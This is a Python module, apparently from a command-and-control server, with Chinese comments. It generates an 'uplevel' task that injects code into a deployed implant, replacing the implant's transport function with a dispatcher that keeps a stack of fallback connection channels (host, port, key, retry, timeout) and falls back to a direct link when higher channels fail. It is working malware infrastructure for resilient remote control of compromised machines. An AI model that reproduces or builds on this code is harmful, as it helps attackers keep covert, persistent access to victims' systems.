"""
server/s_modules/transport_base.py — 传输生成器公共逻辑（T7.1/U2/U5）

多级回退通道栈（U5，不改 implant 模板）:
  uplevel 每次升级往 implant 的全局通道栈 _UPSTK push 一层 (连接函数, 密钥,
  retry, timeout)，栈底是部署时的直连兜底（retry/timeout=0 → 永不弹出）。
  _T 被替换成调度函数 _disp：每轮 cycle 从栈顶尝试，连续失败达到 retry 次
  或 timeout 秒即弹栈退到上一层，逐级回退到直连。retry<=0 且 timeout<=0
  表示该层永不退出（死磕最高线路）。

  全部逻辑经注入代码覆盖 _T + 动态设置 _CK 实现，不依赖修改 implant 模板
  （模板 cycle 里 _CK=_K 先于 _T() 执行，_disp 成功连上后把 _CK 设为该层 key）。
"""

UPGRADE_TEMPLATE = '''\
# --- uplevel: {protocol} {host}:{port} retry={retry} timeout={timeout} ---
{transport_code}

import time as _tm

def _up():
    global _UPSTK, _UPFF, _UPDL, _T
    if '_UPSTK' not in globals():
        _UPSTK = [(_T, _K, 0, 0)]   # 栈底：部署时直连兜底，永不弹
        _UPFF = 0                   # 栈顶连续失败计数
        _UPDL = 0                   # 栈顶首次失败时间戳
    try:
        t = _nT()                    # 探测：能建立连接（TLS 握手 + 指纹校验）
        t.close()
    except Exception as e:
        return "uplevel failed (rolled back): " + str(e)
    _UPFF = 0
    _UPDL = 0
    _UPSTK.append((_nT, bytes.fromhex({key_hex!r}), {retry}, {timeout}))
    _T = _disp
    return "uplevel ok: {protocol} {host}:{port}"

def _disp():
    global _CK, _UPFF, _UPDL
    while _UPSTK:
        fn, key, rtry, tmo = _UPSTK[-1]
        try:
            s = fn()
            _CK = key
            _UPFF = 0
            _UPDL = 0
            return s
        except Exception:
            if _UPFF == 0:
                _UPDL = _tm.time()
            _UPFF += 1
            drop = False
            if rtry > 0 and _UPFF >= rtry:
                drop = True
            if tmo > 0 and _tm.time() - _UPDL >= tmo:
                drop = True
            if drop and len(_UPSTK) > 1:
                _UPSTK.pop()         # 退出这层 → 切回上一层
                _UPFF = 0
                _UPDL = 0
                continue             # 本轮立即用上一层重连
            raise ConnectionError("channel down")

print(_up())
'''


def build_upgrade_task(protocol: str, host: str, port: int,
                       key_hex: str, transport_code: str,
                       retry: int = 3, timeout: int = 0) -> str:
    """组装多级回退升级任务代码（由 uplevel 命令下发）。

    retry: 连续失败 N 次后退出这层回退到上一层（<=0 不限次数）。
    timeout: 连续失败超过 N 秒后退出这层（<=0 不限时间）。
    两者都 <=0 → 该层永不退出（死磕最高线路）。
    """
    return UPGRADE_TEMPLATE.format(
        protocol=protocol, host=host, port=int(port),
        key_hex=key_hex, transport_code=transport_code,
        retry=int(retry), timeout=int(timeout),
    )
